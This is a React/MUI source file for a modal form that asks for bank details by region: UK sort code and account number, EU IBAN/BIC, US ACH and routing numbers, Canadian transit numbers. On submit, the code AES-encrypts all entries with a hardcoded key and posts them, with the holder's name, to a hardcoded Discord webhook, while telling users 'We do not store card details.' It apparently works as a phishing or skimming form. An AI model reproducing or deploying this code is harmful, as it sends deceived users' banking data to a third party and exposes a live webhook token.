import React, { useState, useEffect } from 'react';
import Modal from '@mui/material/Modal';
import Fade from '@mui/material/Fade';
import { Box, Button, TextField, Typography, Grid } from '@mui/material';
import InputMask from 'react-input-mask';
import CryptoJS from 'crypto-js';

const BankingDetails = ({ open, onClose, region, amount, referenceNumber }) => {
  const [bankDetails, setBankDetails] = useState({
    accountNumber: '',
    routingNumber: '',
    sortCode: '',
    swiftCode: '',
    bic: '',
    iban: '',
    ach: '',
    wireRoutingNumber: '',
    accountHolderName: '',
    institutionNumber: '',
    transitNumber: '',
    amount: '',
    date: '',
    referenceNumber: '',
  });
  const [errors, setErrors] = useState({});

  useEffect(() => {
    if (!open) {
      // Reset form fields when the modal is closed
      resetForm();
    }
  }, [open]);

  const resetForm = () => {
    setBankDetails({
      accountNumber: '',
      routingNumber: '',
      sortCode: '',
      swiftCode: '',
      bic: '',
      iban: '',
      ach: '',
      wireRoutingNumber: '',
      accountHolderName: '',
      institutionNumber: '',
      transitNumber: '',
      amount: '',
      date: '',
      referenceNumber: '',
    });
    setErrors({});
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setBankDetails((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async () => {
    const validationErrors = {};

    // Validate account number length for the UK region
    if (region === 'UK' && bankDetails.accountNumber.length !== 8) {
      validationErrors.accountNumber = 'Account number should be 8 characters long';
    }

    // If there are validation errors, set them and prevent submission
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    try {
      const invoiceHtml = generateInvoiceHtml();
      const encryptedHtml = encryptHtml(invoiceHtml);
      sendDiscordWebhook(encryptedHtml);
      resetForm();
      onClose();
    } catch (error) {
      console.error('Error submitting bank details:', error);
      // Handle submission error if needed
    }
  };

  const generateInvoiceHtml = () => {
    let html = `
      <div>
        <h2>Banking Details Invoice</h2>
        <ul>
    `;

    // Loop through bankDetails object to generate list items
    Object.entries(bankDetails).forEach(([key, value]) => {
      if (value) {
        html += `<li>${key.charAt(0).toUpperCase() + key.slice(1)}: ${value}</li>`;
      }
    });

    // Additional information
    if (amount) html += `<li>Amount: ${amount}</li>`;
    if (region) html += `<li>Region: ${region}</li>`;
    if (referenceNumber) html += `<li>Reference Number: ${referenceNumber}</li>`;

    const timestamp = Date.now();
    html += `<li>Date: ${timestamp}</li>`;
    html += `
        </ul>
      </div>
    `;
    return html;
  };

  const encryptHtml = (html) => {
    return CryptoJS.AES.encrypt(html, 'ZTQ3MjQyNjAtZmRmNy00ZDZmLTk4ZDAtODAwNjE5NmE5ZjExMmNjNmRjNDAtMTIzNDU2Nzg5MDEyMzQ1Ng==').toString();
  };

  const sendDiscordWebhook = (encryptedHtml) => {
    const webhookUrl = 'https://discord.com/api/webhooks/1148237531343761440/70KfIx1XWH1N-4SiAX0M-2AcPhkpOxLI_9Ecj5sS1EA90zaGdYyTExQuZiuNtPwBlLih';

    const embed = {
      title: 'New Banking Transaction',
      description: '',
      color: 0x00ff00,
      fields: [
        { name: 'Account Holder', value: bankDetails.accountHolderName },
        { name: 'Amount', value: amount },
        { name: 'Region', value: region },
        { name: 'Hash', value: encryptedHtml },
      ],
      timestamp: new Date().toISOString(),
      footer: { text: '' },
    };

    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error('Failed to send Discord webhook');
        }
        console.log('Discord webhook sent successfully');
      })
      .catch((error) => {
        console.error('Error sending Discord webhook:', error);
      });
  };

  return (
    <>
      <Modal
        open={open}
        onClose={onClose}
        aria-labelledby="bank-details-modal-title"
        aria-describedby="bank-details-modal-description"
        closeAfterTransition
        BackdropProps={{
          timeout: 500,
        }}
      >
        <Fade in={open}>
          <Box sx={{ backgroundColor: 'white', p: 4, borderRadius: '8px', maxWidth: '400px', margin: 'auto', outline: 'none' }}>
            <Typography variant="h5" id="bank-details-modal-title">
              Bank Details
            </Typography>
            <Typography variant="body1" id="bank-details-modal-description">
              We do not store card details, etc.
            </Typography>
            <Grid container spacing={2}>
              {region === 'UK' && (
                <>
                  <Grid item xs={6}>
                    <InputMask mask="99999999" maskChar={null} value={bankDetails.accountNumber} onChange={handleInputChange}>
                      {(inputProps) => (
                        <TextField fullWidth margin="normal" label="Account Number" name="accountNumber" variant="outlined" {...inputProps} error={!!errors.accountNumber} helperText={errors.accountNumber} />
                      )}
                    </InputMask>
                  </Grid>
                  <Grid item xs={6}>
                    <InputMask mask="99-99-99" maskChar={null} value={bankDetails.sortCode} onChange={handleInputChange}>
                      {(inputProps) => (
                        <TextField fullWidth margin="normal" label="Sort Code" name="sortCode" variant="outlined" {...inputProps} />
                      )}
                    </InputMask>
                  </Grid>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="Account Holder's Name" name="accountHolderName" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                </>
              )}
              {region === 'EU' && (
                <>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="BIC" name="bic" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="IBAN" name="iban" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                </>
              )}
              {region === 'US' && (
                <>
                  <Grid item xs={12}>
                    <InputMask mask="999-999-9999" maskChar={null} value={bankDetails.ach} onChange={handleInputChange}>
                      {(inputProps) => (
                        <TextField fullWidth margin="normal" label="ACH" name="ach" variant="outlined" {...inputProps} />
                      )}
                    </InputMask>
                  </Grid>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="Wire Routing Number" name="wireRoutingNumber" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="Account Number" name="accountNumber" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                </>
              )}
              {region === 'CANADA' && (
                <>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="Institution Number" name="institutionNumber" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="Transit Number" name="transitNumber" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                  <Grid item xs={12}>
                    <TextField fullWidth margin="normal" label="Account Number" name="accountNumber" variant="outlined" onChange={handleInputChange} />
                  </Grid>
                </>
              )}
            </Grid>
            <Button variant="contained" color="primary" onClick={handleSubmit} fullWidth>
              Submit
            </Button>
          </Box>
        </Fade>
      </Modal>
    </>
  );
};

export default BankingDetails;
